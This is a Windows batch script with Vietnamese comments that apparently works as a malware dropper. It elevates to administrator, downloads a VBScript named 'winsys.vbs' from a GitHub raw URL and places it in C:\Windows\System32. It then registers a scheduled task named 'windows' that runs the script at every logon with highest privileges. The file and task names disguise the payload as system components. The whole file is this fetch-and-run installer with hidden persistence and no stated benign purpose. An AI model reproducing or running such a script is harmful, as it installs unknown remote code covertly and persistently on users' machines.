@echo off
:: Kiểm tra quyền quản trị
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Vui lòng chạy với quyền quản trị.
    powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)

:: Thiết lập biến
set "winsysUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
set "destinationDir=C:\Program Files\Windows NT\ADB"
set "winsysDownloadFile=winsys.vbs"
set "taskName=windows"

:: Tạo thư mục nếu chưa tồn tại
if not exist "%destinationDir%" (
    mkdir "%destinationDir%"
)

:: Chuyển đến thư mục đích
cd /d "%destinationDir%"

:: Tải xuống tệp winsys.vbs
curl -L -o "%winsysDownloadFile%" "%winsysUrl%"

:: Kiểm tra xem tệp winsys.vbs đã tải xuống thành công chưa
if exist "%winsysDownloadFile%" (
    :: Di chuyển winsys.vbs vào C:\Windows\System32
    move /y "%winsysDownloadFile%" "C:\Windows\System32\%winsysDownloadFile%"

    if not exist "C:\Windows\System32\%winsysDownloadFile%" (
        exit
    )
) else (
    exit
)

:: Kiểm tra và xóa tác vụ cũ nếu có
schtasks /query /tn "%taskName%" >nul 2>&1
if %errorlevel% equ 0 (
    echo Tác vụ đã tồn tại, đang xóa tác vụ cũ...
    schtasks /delete /tn "%taskName%" /f >nul 2>&1
)

:: Tạo tác vụ trong Task Scheduler để chạy winsys.vbs bằng wscript.exe
schtasks /create /tn "%taskName%" /tr "\"C:\Windows\System32\wscript.exe\" \"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /RL HIGHEST /F

:: Kiểm tra kết quả tạo tác vụ
if %errorlevel% neq 0 (
    echo Tạo tác vụ thất bại.
) else (
    echo Tác vụ đã được tạo thành công.
)

exit
